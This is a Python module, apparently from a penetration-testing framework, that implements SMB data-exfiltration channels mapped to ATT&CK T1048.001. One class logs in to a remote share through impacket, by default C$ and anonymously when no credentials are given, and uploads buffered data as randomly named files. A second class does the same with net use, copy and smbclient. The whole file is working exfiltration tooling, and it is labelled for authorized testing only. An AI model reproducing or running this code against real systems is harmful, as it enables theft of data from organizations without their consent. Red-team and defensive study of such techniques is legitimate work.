#!/usr/bin/env python3
"""
SMB 外泄通道 - SMB Exfiltration Channel
ATT&CK Technique: T1048.001 - Exfiltration Over Symmetric Encrypted Non-C2 Protocol

通过 SMB 协议进行数据外泄
仅用于授权渗透测试和安全研究

Warning: 仅限授权渗透测试使用！
"""

from typing import Optional
import logging
import tempfile
from pathlib import Path

from ..base import (
    BaseExfiltration,
    ExfilConfig,
    ExfilChannel,
    ExfilStatus,
)

logger = logging.getLogger(__name__)


class SMBExfiltration(BaseExfiltration):
    """
    SMB 外泄通道

    通过 SMB 共享写入文件进行数据外泄

    Warning: 仅限授权渗透测试使用！
    """

    name = 'smb_exfil'
    description = 'SMB Exfiltration Channel'
    channel = ExfilChannel.SMB

    def __init__(self, config: ExfilConfig):
        super().__init__(config)
        self._conn = None
        self._share = 'C$'
        self._remote_path = ''
        self._buffer = b''
        self._temp_file = None

    def connect(self) -> bool:
        """建立 SMB 连接"""
        try:
            from impacket.smbconnection import SMBConnection

            # 解析目标
            # 格式: user:password@host/share/path 或 host
            target = self.config.destination
            username = ''
            password = ''
            domain = ''

            if '@' in target:
                creds, target = target.rsplit('@', 1)
                if ':' in creds:
                    username, password = creds.split(':', 1)
                else:
                    username = creds

            if '/' in target:
                parts = target.split('/')
                host = parts[0]
                self._share = parts[1] if len(parts) > 1 else 'C$'
                self._remote_path = '/'.join(parts[2:]) if len(parts) > 2 else ''
            else:
                host = target

            # 建立连接
            self._conn = SMBConnection(host, host, sess_port=self.config.port)

            if username:
                self._conn.login(username, password, domain)
            else:
                # 匿名登录
                self._conn.login('', '')

            # 生成远程文件名
            import uuid
            filename = f"temp_{uuid.uuid4().hex[:8]}.dat"
            if self._remote_path:
                self._remote_path = f"{self._remote_path}/{filename}"
            else:
                self._remote_path = filename

            return True

        except ImportError:
            self.logger.error("impacket library not available")
            return False
        except Exception as e:
            self.logger.error(f"SMB connection failed: {e}")
            return False

    def disconnect(self) -> None:
        """断开 SMB 连接"""
        if self._conn:
            try:
                self._conn.close()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            self._conn = None

        # 清理临时文件
        if self._temp_file:
            try:
                Path(self._temp_file).unlink(missing_ok=True)
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

    def send_chunk(self, data: bytes) -> bool:
        """
        发送数据块

        Args:
            data: 数据块

        Returns:
            是否成功
        """
        if not self._conn:
            return False

        try:
            # 累积数据
            self._buffer += data

            # 当缓冲区足够大时写入
            if len(self._buffer) >= self.config.chunk_size * 10:
                return self._flush_buffer()

            return True

        except Exception as e:
            self.logger.error(f"SMB send chunk failed: {e}")
            return False

    def _flush_buffer(self) -> bool:
        """将缓冲区数据写入 SMB 共享"""
        if not self._buffer:
            return True

        try:
            # 使用 impacket 写入文件
            with tempfile.NamedTemporaryFile(delete=False) as f:
                f.write(self._buffer)
                self._temp_file = f.name

            # 上传到 SMB
            with open(self._temp_file, 'rb') as f:
                self._conn.putFile(self._share, self._remote_path, f.read)

            self._buffer = b''
            return True

        except Exception as e:
            self.logger.error(f"SMB flush failed: {e}")
            return False

    def exfiltrate(self, data: bytes):
        """重写以确保最终刷新"""
        result = super().exfiltrate(data)

        # 确保剩余数据被发送
        if self._buffer and self._conn:
            self._flush_buffer()

        return result


class SMBExfiltrationNative(BaseExfiltration):
    """
    SMB 外泄通道（原生实现）

    使用系统原生 SMB 命令进行数据外泄
    不需要 impacket 库

    Warning: 仅限授权渗透测试使用！
    """

    name = 'smb_native_exfil'
    description = 'SMB Native Exfiltration Channel'
    channel = ExfilChannel.SMB

    def __init__(self, config: ExfilConfig):
        super().__init__(config)
        self._temp_dir = None
        self._remote_path = ''

    def connect(self) -> bool:
        """准备 SMB 连接"""
        import platform
        import subprocess

        # 解析目标
        target = self.config.destination
        if not target.startswith('\\\\'):
            target = f'\\\\{target}'

        self._remote_path = target

        # 在 Windows 上使用 net use
        if platform.system() == 'Windows':
            try:
                # 测试连接
                result = subprocess.run(
                    ['net', 'use', self._remote_path],
                    capture_output=True,
                    timeout=self.config.timeout
                )
                return result.returncode == 0
            except Exception:
                return False

        # 在 Linux 上使用 smbclient
        else:
            try:
                result = subprocess.run(
                    ['smbclient', '-L', self._remote_path, '-N'],
                    capture_output=True,
                    timeout=self.config.timeout
                )
                return result.returncode == 0
            except Exception:
                return False

    def disconnect(self) -> None:
        """清理连接"""
        pass

    def send_chunk(self, data: bytes) -> bool:
        """通过系统命令发送数据"""
        import platform
        import subprocess
        import shutil
        import uuid

        try:
            # 创建临时文件
            temp_dir = Path(tempfile.gettempdir())
            temp_file = temp_dir / f"exfil_{uuid.uuid4().hex[:8]}.dat"
            temp_file.write_bytes(data)

            if platform.system() == 'Windows':
                # 使用 shutil.copy 代替 shell=True 的 copy 命令
                # 避免命令注入风险
                remote_file = Path(self._remote_path) / temp_file.name
                try:
                    shutil.copy(str(temp_file), str(remote_file))
                    success = True
                except (OSError, IOError) as e:
                    self.logger.warning(f"shutil.copy failed: {e}")
                    # 降级到 cmd /c copy，但不使用 shell=True
                    # 使用列表参数避免命令注入
                    result = subprocess.run(
                        ['cmd', '/c', 'copy', str(temp_file), str(remote_file)],
                        capture_output=True,
                        shell=False,  # 安全: 不使用 shell=True
                        timeout=self.config.timeout
                    )
                    success = result.returncode == 0
            else:
                # 使用 smbclient
                # 注意: 使用 shlex.quote 对路径进行转义以防止注入
                import shlex
                put_cmd = f'put {shlex.quote(str(temp_file))} {shlex.quote(temp_file.name)}'
                result = subprocess.run(
                    ['smbclient', self._remote_path, '-N', '-c', put_cmd],
                    capture_output=True,
                    timeout=self.config.timeout
                )
                success = result.returncode == 0

            # 清理临时文件
            temp_file.unlink(missing_ok=True)

            return success

        except Exception as e:
            self.logger.error(f"SMB native send failed: {e}")
            return False


__all__ = ['SMBExfiltration', 'SMBExfiltrationNative']
